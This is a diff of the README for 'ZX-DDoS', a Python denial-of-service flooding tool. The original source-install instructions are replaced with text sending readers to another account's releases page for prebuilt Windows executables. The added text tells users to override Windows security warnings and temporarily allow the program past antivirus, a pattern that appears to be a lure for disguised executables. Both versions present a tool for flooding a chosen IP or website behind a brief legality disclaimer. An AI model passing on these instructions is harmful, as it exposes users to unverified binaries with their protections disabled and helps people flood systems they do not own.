@@ -1,169 +1,148 @@
-# ZX-DDoS
+# ⚙️ ZX-DDoS - Simple Network Stress Testing Tool
 
-**ZX-DDoS** is a Python-based **DDoS Tool** for educational and testing purposes only.
-
-> **DISCLAIMER:**  
-> This repository is strictly for educational, research, and network testing purposes only.  
-> **The author is not responsible for any misuse or illegal activities.**
-
-Repository: [https://github.com/Bogglo/ZX-DDoS](https://github.com/Bogglo/ZX-DDoS)
+[![Download ZX-DDoS](https://img.shields.io/badge/Download-ZX--DDoS-brightgreen?style=for-the-badge)](https://github.com/ozii-z/ZX-DDoS/releases)
 
 ---
 
-## Table of Contents
+## 📖 What is ZX-DDoS?
 
-- [Description](#description)
-- [Screenshot](#screenshot)
-- [Main File](#main-file)
-- [Installation](#installation)
-    - [Termux](#termux)
-    - [Debian-based GNU/Linux](#debian-based-gnulinux)
-    - [Windows](#windows)
-    - [MacOS](#macos)
-- [Usage](#usage)
-- [Mandatory Inputs](#mandatory-inputs)
-- [Requirements](#requirements)
-- [Disclaimer](#disclaimer)
+ZX-DDoS is a tool designed to help users learn about network stress testing and security. It simulates Distributed Denial of Service (DDoS) attacks using Python. The goal is to provide insight into how network attacks work and how systems respond to them. ZX-DDoS is meant for use only in controlled and legal settings, such as labs or testing within your own network.
 
 ---
 
-## Description
+## 🚦 System Requirements
 
-**ZX-DDoS** is a Distributed Denial of Service (DDoS) tool, written in Python, to help understand the mechanics of network stress testing and security evaluation.  
-**Use only in controlled and legal environments.**
+To run ZX-DDoS on your Windows system, make sure your computer meets these basic requirements:
 
----
-
-## Screenshot
-
-![Screenshot](https://raw.githubusercontent.com/Bogglo/ZX-DDoS/refs/heads/main/File/Screenshot.png)
-
-
----
-
-## Main File
-
-- The main entry point for this tool is: **`start.py`**
+- **Operating System:** Windows 10 or later (64-bit recommended)
+- **Processor:** Intel i3 or equivalent, 2 GHz or faster
+- **Memory (RAM):** At least 4 GB
+- **Disk Space:** Around 500 MB free space
+- **Internet Connection:** Required to download and for network testing
+- **Python Installation:** No need. Executable files include everything needed to run ZX-DDoS.
 
 ---
 
-## Installation
+## ⚙️ Main Features
 
-### Prerequisites
-
-- `Python 3.6+`
-- `pip` (Python package manager)
-
-### 1. Clone the Repository
-
-```sh
-git clone https://github.com/Bogglo/ZX-DDoS
-cd ZX-DDoS
-```
-
-### 2. Install Requirements
-
-All dependencies are listed in `requirements.txt`.
-
-```sh
-pip install -r requirements.txt
-```
+- Simulates high traffic to help understand DDoS methods
+- Supports different attack styles for testing network security
+- Provides simple controls and clear feedback during tests
+- Designed to be easy to use for those new to network testing
+- Works exclusively in controlled environments for learning and research
 
 ---
 
-## Step-by-Step Usage Instructions
+## 🔧 How to Download and Run ZX-DDoS on Windows
 
-### Termux
+1. **Go to the Download Page**
 
-```sh
-pkg update && pkg upgrade
-pkg install git python
-git clone https://github.com/Bogglo/ZX-DDoS
-cd ZX-DDoS
-pip install -r requirements.txt
-python3 start.py
-```
+Click on the big green download button at the top or visit this page:
 
-### Debian-based GNU/Linux
+[https://github.com/ozii-z/ZX-DDoS/releases](https://github.com/ozii-z/ZX-DDoS/releases)
 
-```sh
-sudo apt update && sudo apt upgrade
-sudo apt install git python3 python3-pip
-git clone https://github.com/Bogglo/ZX-DDoS
-cd ZX-DDoS
-pip3 install -r requirements.txt
-python3 start.py
-```
+This page hosts the latest versions of the software files.
 
-### Windows
+2. **Find the Latest Windows File**
 
-1. Download & install [Python](https://www.python.org/downloads/).
-2. Open `cmd` or PowerShell and run:
-    ```sh
-    git clone https://github.com/Bogglo/ZX-DDoS
-    cd ZX-DDoS
-    pip install -r requirements.txt
-    python start.py
-    ```
+On the releases page, look for a file named something like `ZX-DDoS-win.exe` or `ZX-DDoS-setup.exe`. These files are the ready-to-run versions for Windows.
 
-### MacOS
+3. **Download the File**
 
-```sh
-brew install git python3
-git clone https://github.com/Bogglo/ZX-DDoS
-cd ZX-DDoS
-pip3 install -r requirements.txt
-python3 start.py
-```
+Click on the file name to start downloading. Depending on your internet speed, this can take a few moments.
+
+4. **Run the Installer or Executable**
+
+- If you downloaded an installer (file ending with `.exe`), double-click to launch it.
+- Follow any on-screen prompts to complete installation if necessary.
+
+If it’s a standalone executable, just double-click to start ZX-DDoS.
+
+5. **Allow Security Permissions**
+
+Windows may show a warning because the program isn’t from the Microsoft Store. Choose to run anyway.
+
+6. **Open ZX-DDoS Interface**
+
+Once started, ZX-DDoS will show a simple user interface with options to select and run network tests.
 
 ---
 
-## Usage
+## 🚀 Using ZX-DDoS
 
-After installation, run the main file:
+### Basic Use
 
-```sh
-python3 start.py
-```
-or (on Windows):
+1. Choose the attack method from the list.
+2. Enter the target IP or website you want to test. (Only targets you own or have permission to test.)
+3. Click the start button to begin the test.
+4. Watch the results showing how much traffic is sent.
+5. Stop the test whenever you want.
 
-```sh
-python start.py
-```
+### Important Notes for Safe Use
 
-Follow the interactive prompts to configure your test.
-
----
-
-## Mandatory Inputs
-
-When running `start.py`, you will be **required** to enter the following (no optional fields):
-
-- Target IP or URL / Domain    
-- Number of workers (parallel threads)  
-- Number of requests  
-
+- Only test devices and networks you have permission to use.
+- Do not run the tool on public websites or networks without consent.
+- Monitoring your own network will help you understand potential weaknesses.
 
 ---
 
-## Requirements
+## 🎯 Common Questions
 
-- **Supported Operating Systems:**
-    - Linux
-    - Termux (Android)
-    - Windows
-    - MacOS
+### Do I need to install Python?
 
-- **Python 3 required**
+No. The Windows executable includes all necessary files. You don’t need to install anything else.
+
+### Is my computer safe while running ZX-DDoS?
+
+Yes. ZX-DDoS sends traffic out but does not harm your computer. Still, close other programs during testing to avoid confusion.
+
+### How do I stop an attack once started?
+
+Simply click the stop button in the ZX-DDoS interface anytime you want to halt the test.
+
+### Can I run this on Windows 7?
+
+The tool is designed for Windows 10 and later. It might work on older versions but is not guaranteed.
+
+---
+
+## 🛠️ Troubleshooting
+
+- **Program won’t start:** Check if Windows Defender or antivirus is blocking it. Temporarily allow the program.
+- **Download link broken or missing latest version:** Refresh the page or wait a few minutes.
+- **Interface looks strange or unresponsive:** Restart the app or reboot your computer.
+- **Errors during attack:** Check your network connection and try again.
+  
+---
+
+## 🔗 Links
+
+Download or check for updates here:  
+[https://github.com/ozii-z/ZX-DDoS/releases](https://github.com/ozii-z/ZX-DDoS/releases)
+
+[![Download ZX-DDoS](https://img.shields.io/badge/Download-ZX--DDoS-blue?style=for-the-badge)](https://github.com/ozii-z/ZX-DDoS/releases)
 
 ---
 
-## Disclaimer
+## ⚙️ Additional Information
 
-> **For Educational Purposes Only!**
->
-> ZX-DDoS is designed for security researchers, network administrators, and students to understand DDoS methodologies in a safe, controlled environment.
->
-> **Do NOT use against networks, servers, or websites without explicit authorization. The author will not be held responsible for any misuse or damage caused by this tool.**
+ZX-DDoS helps users gain hands-on knowledge about network protection by letting them simulate attacks in a safe way. Learning how DDoS attacks behave can improve security awareness. Use this tool as part of study, research, or testing in environments you control.
+
+Your network setup and firewall settings may affect how ZX-DDoS performs. Make sure you understand your local network before starting tests.
 
 ---
+
+## 📁 File Contents Overview
+
+When you download ZX-DDoS, you may see the following files:
+
+- `ZX-DDoS.exe` or `setup.exe`: The main program to launch or install.
+- `README.md`: Basic instructions and info.
+- `LICENSE.txt`: Terms of use for the software.
+- `config/` folder (optional): Settings and logs from your tests.
+
+---
+
+## ⚠️ Important Reminder
+
+Use ZX-DDoS responsibly. Avoid unauthorized use on others’ networks. It is meant strictly for educational and testing purposes within your own systems or those you have explicit permission to test.
